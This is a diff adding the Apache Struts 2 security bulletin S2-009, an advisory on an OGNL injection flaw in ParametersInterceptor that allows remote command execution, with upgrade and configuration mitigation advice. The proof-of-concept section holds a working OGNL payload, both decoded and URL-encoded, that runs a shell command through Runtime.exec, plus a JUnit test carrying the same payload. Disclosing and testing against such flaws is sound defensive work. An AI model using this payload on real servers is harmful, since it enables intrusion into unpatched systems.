@@ -1,0 +1,267 @@
+
+<!-- 
+Licensed to the Apache Software Foundation (ASF) under one
+or more contributor license agreements.  See the NOTICE file
+distributed with this work for additional information
+regarding copyright ownership.  The ASF licenses this file
+to you under the Apache License, Version 2.0 (the
+"License"); you may not use this file except in compliance
+with the License.  You may obtain a copy of the License at
+
+ http://www.apache.org/licenses/LICENSE- 2.0
+
+Unless required by applicable law or agreed to in writing,
+software distributed under the License is distributed on an
+"AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
+KIND, either express or implied.  See the License for the
+specific language governing permissions and limitations
+under the License. 
+-->
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML>
+  <HEAD>
+    <LINK type="text/css" rel="stylesheet" href="https://struts.apache.org/css/default.css">
+    <STYLE type="text/css">
+      .dp-highlighter {
+        width:95% !important;
+      }
+    </STYLE>
+    <STYLE type="text/css">
+      .footer {
+        background-image:      url('https://cwiki.apache.org/confluence/images/border/border_bottom.gif');
+        background-repeat:     repeat-x;
+        background-position:   left top;
+        padding-top:           4px;
+        color:                 #666;
+      }
+    </STYLE>
+    <SCRIPT type="text/javascript" language="javascript">
+      var hide = null;
+      var show = null;
+      var children = null;
+
+      function init() {
+        /* Search form initialization */
+        var form = document.forms['search'];
+        if (form != null) {
+          form.elements['domains'].value = location.hostname;
+          form.elements['sitesearch'].value = location.hostname;
+        }
+
+        /* Children initialization */
+        hide = document.getElementById('hide');
+        show = document.getElementById('show');
+        children = document.all != null ?
+                   document.all['children'] :
+                   document.getElementById('children');
+        if (children != null) {
+          children.style.display = 'none';
+          show.style.display = 'inline';
+          hide.style.display = 'none';
+        }
+      }
+
+      function showChildren() {
+        children.style.display = 'block';
+        show.style.display = 'none';
+        hide.style.display = 'inline';
+      }
+
+      function hideChildren() {
+        children.style.display = 'none';
+        show.style.display = 'inline';
+        hide.style.display = 'none';
+      }
+    </SCRIPT>
+    <TITLE>S2-009</TITLE>
+  <META http-equiv="Content-Type" content="text/html;charset=UTF-8"></HEAD>
+  <BODY onload="init()">
+    <TABLE border="0" cellpadding="2" cellspacing="0" width="100%">
+      <TR class="topBar">
+        <TD align="left" valign="middle" class="topBarDiv" align="left" nowrap="">
+          &nbsp;<A href="home.html" title="Apache Struts 2 Documentation">Apache Struts 2 Documentation</A>&nbsp;&gt;&nbsp;<A href="home.html" title="Home">Home</A>&nbsp;&gt;&nbsp;<A href="security-bulletins.html" title="Security Bulletins">Security Bulletins</A>&nbsp;&gt;&nbsp;<A href="" title="S2-009">S2-009</A>
+        </TD>
+        <TD align="right" valign="middle" nowrap="">
+          <FORM name="search" action="http://www.google.com/search" method="get">
+            <INPUT type="hidden" name="ie" value="UTF-8">
+            <INPUT type="hidden" name="oe" value="UTF-8">
+            <INPUT type="hidden" name="domains" value="">
+            <INPUT type="hidden" name="sitesearch" value="">
+            <INPUT type="text" name="q" maxlength="255" value="">        
+            <INPUT type="submit" name="btnG" value="Google Search">
+          </FORM>
+        </TD>
+      </TR> 
+    </TABLE>
+
+    <DIV id="PageContent">
+      <DIV class="pageheader" style="padding: 6px 0px 0px 0px;">
+        <!-- We'll enable this once we figure out how to access (and save) the logo resource -->
+        <!--img src="/wiki/images/confluence_logo.gif" style="float: left; margin: 4px 4px 4px 10px;" border="0"-->
+        <DIV style="margin: 0px 10px 0px 10px" class="smalltext">Apache Struts 2 Documentation</DIV>
+        <DIV style="margin: 0px 10px 8px 10px" class="pagetitle">S2-009</DIV>
+
+        <DIV class="greynavbar" align="right" style="padding: 2px 10px; margin: 0px;">
+          <A href="https://cwiki.apache.org/confluence/pages/editpage.action?pageId=27836151">
+            <IMG src="https://cwiki.apache.org/confluence/images/icons/notep_16.gif" height="16" width="16" border="0" align="absmiddle" title="Edit Page"></A>
+            <A href="https://cwiki.apache.org/confluence/pages/editpage.action?pageId=27836151">Edit Page</A>
+          &nbsp;
+          <A href="https://cwiki.apache.org/confluence/pages/listpages.action?key=WW">
+            <IMG src="https://cwiki.apache.org/confluence/images/icons/browse_space.gif" height="16" width="16" border="0" align="absmiddle" title="Browse Space"></A>
+            <A href="https://cwiki.apache.org/confluence/pages/listpages.action?key=WW">Browse Space</A>
+          &nbsp;
+          <A href="https://cwiki.apache.org/confluence/pages/createpage.action?spaceKey=WW&fromPageId=27836151">
+            <IMG src="https://cwiki.apache.org/confluence/images/icons/add_page_16.gif" height="16" width="16" border="0" align="absmiddle" title="Add Page"></A>
+          <A href="https://cwiki.apache.org/confluence/pages/createpage.action?spaceKey=WW&fromPageId=27836151">Add Page</A>
+          &nbsp;
+          <A href="https://cwiki.apache.org/confluence/pages/createblogpost.action?spaceKey=WW&fromPageId=27836151">
+            <IMG src="https://cwiki.apache.org/confluence/images/icons/add_blogentry_16.gif" height="16" width="16" border="0" align="absmiddle" title="Add News"></A>
+          <A href="https://cwiki.apache.org/confluence/pages/createblogpost.action?spaceKey=WW&fromPageId=27836151">Add News</A>
+        </DIV>
+      </DIV>
+
+      <DIV class="pagecontent">
+        <DIV class="wiki-content">
+          <H2><A name="S2-009-Summary"></A>Summary</H2>
+
+
+<P>ParameterInterceptor vulnerability allows remote command execution</P>
+
+
+<DIV class="table-wrap">
+<TABLE class="confluenceTable"><TBODY>
+<TR>
+<TH class="confluenceTh">Who should read this</TH>
+<TD class="confluenceTd">All Struts 2 developers</TD>
+</TR>
+<TR>
+<TH class="confluenceTh">Impact of vulnerability</TH>
+<TD class="confluenceTd">Remote command execution</TD>
+</TR>
+<TR>
+<TH class="confluenceTh">Maximum security rating</TH>
+<TD class="confluenceTd">Critical</TD>
+</TR>
+<TR>
+<TH class="confluenceTh">Recommendation</TH>
+<TD class="confluenceTd">Developers should immediately upgrade to <A href="http://struts.apache.org/download.cgi#struts2312" class="external-link" rel="nofollow">Struts 2.3.1.2</A> or read the following solution instructions carefully for a configuration change to mitigate the vulnerability</TD>
+</TR>
+<TR>
+<TH class="confluenceTh">Affected Software</TH>
+<TD class="confluenceTd"> Struts 2.0.0 - Struts 2.3.1.1 </TD>
+</TR>
+<TR>
+<TH class="confluenceTh">Reporter</TH>
+<TD class="confluenceTd"> Meder Kydyraliev, Google Security Team </TD>
+</TR>
+<TR>
+<TH class="confluenceTh">CVE Identifier</TH>
+<TD class="confluenceTd"><A href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3923" class="external-link" rel="nofollow">CVE-2011-3923</A></TD>
+</TR>
+<TR>
+<TH class="confluenceTh">Original Description</TH>
+<TD class="confluenceTd"> Reported directly to security@struts.a.o</TD>
+</TR>
+</TBODY></TABLE>
+</DIV>
+
+<H2><A name="S2-009-Problem"></A>Problem</H2>
+
+<P>OGNL provides, among other features, extensive expression <A href="http://commons.apache.org/ognl/language-guide.html#Expression_Evaluation" class="external-link" rel="nofollow">evaluation capabilities</A>. The vulnerability allows a malicious user to bypass all the protections (regex pattern, deny method invocation) built into the ParametersInterceptor, thus being able to inject a malicious expression in any exposed string variable for further evaluation. </P>
+
+<P>A similar behavior was already addressed in <A href="s2-003.html" title="S2-003">S2&#45;003</A> and <A href="s2-005.html" title="S2-005">S2&#45;005</A>, but it turned out that the resulting fix based on whitelisting acceptable parameter names closed the vulnerability only partially. <BR>
+Regular expression in ParametersInterceptor matches top['foo'](0) as a valid expression, which OGNL treats as (top['foo'])(0) and evaluates the value of 'foo' action parameter as an OGNL expression. This lets malicious users put arbitrary OGNL statements into any String variable exposed by an action and have it evaluated as an OGNL expression and since OGNL statement is in HTTP parameter value attacker can use blacklisted characters (e.g. #) to disable method execution and execute arbitrary methods, bypassing the ParametersInterceptor and OGNL library protections.</P>
+
+<H2><A name="S2-009-Proofofconcept"></A>Proof of concept</H2>
+<DIV class="code panel" style="border-width: 1px;"><DIV class="codeHeader panelHeader" style="border-bottom-width: 1px;"><B>Vulnerable Action</B></DIV><DIV class="codeContent panelContent">
+<PRE class="code-java">
+<SPAN class="code-keyword">public</SPAN> class FooAction {
+    <SPAN class="code-keyword">private</SPAN> <SPAN class="code-object">String</SPAN> foo;
+
+    <SPAN class="code-keyword">public</SPAN> <SPAN class="code-object">String</SPAN> execute() {
+        <SPAN class="code-keyword">return</SPAN> <SPAN class="code-quote">&quot;success&quot;</SPAN>;
+    }
+    <SPAN class="code-keyword">public</SPAN> <SPAN class="code-object">String</SPAN> getFoo() {
+        <SPAN class="code-keyword">return</SPAN> foo;
+    }
+
+    <SPAN class="code-keyword">public</SPAN> void setFoo(<SPAN class="code-object">String</SPAN> foo) {
+        <SPAN class="code-keyword">this</SPAN>.foo = foo;
+    }
+}
+
+</PRE>
+</DIV></DIV>
+
+<P>Here's an actual decoded example, which will create /tmp/PWNAGE directory:</P>
+
+<DIV class="preformatted panel" style="border-width: 1px;"><DIV class="preformattedContent panelContent">
+<PRE>/action?foo=(#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]= new java.lang.Boolean(false), #_memberAccess[&quot;allowStaticMethodAccess&quot;]= new java.lang.Boolean(true), @java.lang.Runtime@getRuntime().exec('mkdir /tmp/PWNAGE'))(meh)&amp;z[(foo)('meh')]=true
+</PRE>
+</DIV></DIV>
+
+<P>encoded version:</P>
+<DIV class="preformatted panel" style="border-width: 1px;"><DIV class="preformattedContent panelContent">
+<PRE>/action?foo=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27mkdir%20/tmp/PWNAGE%27%29%29%28meh%29&amp;z[%28foo%29%28%27meh%27%29]=true
+</PRE>
+</DIV></DIV>
+
+<P>And the JUnit version</P>
+<DIV class="code panel" style="border-width: 1px;"><DIV class="codeHeader panelHeader" style="border-bottom-width: 1px;"><B>PoC</B></DIV><DIV class="codeContent panelContent">
+<PRE class="code-java">
+<SPAN class="code-keyword">public</SPAN> class FooActionTest <SPAN class="code-keyword">extends</SPAN> org.apache.struts2.StrutsJUnit4TestCase&lt;FooAction&gt; {
+    @Test
+    <SPAN class="code-keyword">public</SPAN> void testExecute() <SPAN class="code-keyword">throws</SPAN> Exception {
+        request.setParameter(<SPAN class="code-quote">&quot;foo&quot;</SPAN>, <SPAN class="code-quote">&quot;(#context[\&quot;</SPAN>xwork.MethodAccessor.denyMethodExecution\<SPAN class="code-quote">&quot;]= <SPAN class="code-keyword">new</SPAN> &quot;</SPAN> +
+                <SPAN class="code-quote">&quot;java.lang.<SPAN class="code-object">Boolean</SPAN>(<SPAN class="code-keyword">false</SPAN>), #_memberAccess[\&quot;</SPAN>allowStaticMethodAccess\<SPAN class="code-quote">&quot;]= <SPAN class="code-keyword">new</SPAN> java.lang.<SPAN class="code-object">Boolean</SPAN>(<SPAN class="code-keyword">true</SPAN>), &quot;</SPAN> +
+                <SPAN class="code-quote">&quot;@java.lang.<SPAN class="code-object">Runtime</SPAN>@getRuntime().exec('mkdir /tmp/PWNAGE'))(meh)&quot;</SPAN>);
+
+        request.setParameter(<SPAN class="code-quote">&quot;top['foo'](0)&quot;</SPAN>, <SPAN class="code-quote">&quot;<SPAN class="code-keyword">true</SPAN>&quot;</SPAN>);
+
+        <SPAN class="code-object">String</SPAN> res = <SPAN class="code-keyword">this</SPAN>.executeAction(<SPAN class="code-quote">&quot;/example/foo.action&quot;</SPAN>);
+        FooAction action = <SPAN class="code-keyword">this</SPAN>.getAction();
+
+        File pwn = <SPAN class="code-keyword">new</SPAN> File(<SPAN class="code-quote">&quot;/tmp/PWNAGE&quot;</SPAN>);
+        Assert.assertFalse(<SPAN class="code-quote">&quot;Remote exploit: The PWN folder has been created&quot;</SPAN>, pwn.exists());
+    }
+}
+
+</PRE>
+</DIV></DIV>
+
+<H2><A name="S2-009-Solution"></A>Solution</H2>
+
+<P>The regex pattern inside the ParameterInterceptor was changed to provide a more narrow space of acceptable parameter names. <BR>
+Furthermore the new setParameter method provided by the value stack will allow no more eval expression inside the param names.</P>
+
+
+<DIV class="panelMacro"><TABLE class="warningMacro"><COLGROUP><COL width="24"><COL></COLGROUP><TR><TD valign="top"><IMG src="https://cwiki.apache.org/confluence/images/icons/emoticons/forbidden.gif" width="16" height="16" align="absmiddle" alt="" border="0"></TD><TD><B>It is strongly recommended to upgrade to <A href="http://struts.apache.org/download.cgi#struts2312" class="external-link" rel="nofollow">Struts 2.3.1.2</A>, which contains the corrected OGNL and XWork library.</B></TD></TR></TABLE></DIV>
+
+<P>In case an upgrade isn't possible in a particular environment, there is a configuration based mitigation workaround:</P>
+
+<H3><A name="S2-009-PossibleMitigationWorkaround%3AConfigureParametersIntercptorinstruts.xmltoExcludeMaliciousParameters"></A>Possible Mitigation Workaround: Configure ParametersIntercptor in struts.xml to Exclude Malicious Parameters</H3>
+
+<P>The following additional interceptor-ref configuration should mitigate the problem when applied correctly, allowing only simple navigational expression:</P>
+<DIV class="code panel" style="border-width: 1px;"><DIV class="codeContent panelContent">
+<PRE class="code-java">
+&lt;interceptor-ref name=<SPAN class="code-quote">&quot;params&quot;</SPAN>&gt;
+	&lt;param name=<SPAN class="code-quote">&quot;acceptParamNames&quot;</SPAN>&gt;\w+((\.\w+)|(\[\d+\])|(\['\w+'\]))*&lt;/param&gt;
+&lt;/interceptor-ref&gt;
+</PRE>
+</DIV></DIV>
+<DIV class="panelMacro"><TABLE class="noteMacro"><COLGROUP><COL width="24"><COL></COLGROUP><TR><TD valign="top"><IMG src="https://cwiki.apache.org/confluence/images/icons/emoticons/warning.gif" width="16" height="16" align="absmiddle" alt="" border="0"></TD><TD>Beware that the above pattern breaks <A href="http://struts.apache.org/2.3.1.1/docs/type-conversion.html#TypeConversion-CollectionandMapSupport" class="external-link" rel="nofollow">the type conversion support for collection and map</A> (those parameter names should be attached to acceptParamNames variable).<BR>
+For this configuration to work correctly, it has to be applied to <B>any params interceptor ref in any stack an application is using</B>.<BR>
+E.g., if an application is configured to use defaultStack as well as paramsPrepareParamsStack, you should copy both stack definitions from struts-default.xml to the application's struts.xml config file and apply the described excludeParams configuration for each params interceptor ref, that is <B>once for defaultStack and twice for paramsPrepareParamsStack</B></TD></TR></TABLE></DIV>
+        </DIV>
+
+        
+      </DIV>
+    </DIV>
+    <DIV class="footer">
+      Generated by
+      <A href="http://www.atlassian.com/confluence/">Atlassian Confluence</A> (Version: 3.4.9 Build: 2042 Feb 14, 2011)
+      <A href="http://could.it/autoexport/">Auto Export Plugin</A> (Version: 1.0.0-dkulp)
+    </DIV>
+  </BODY>
+</HTML>
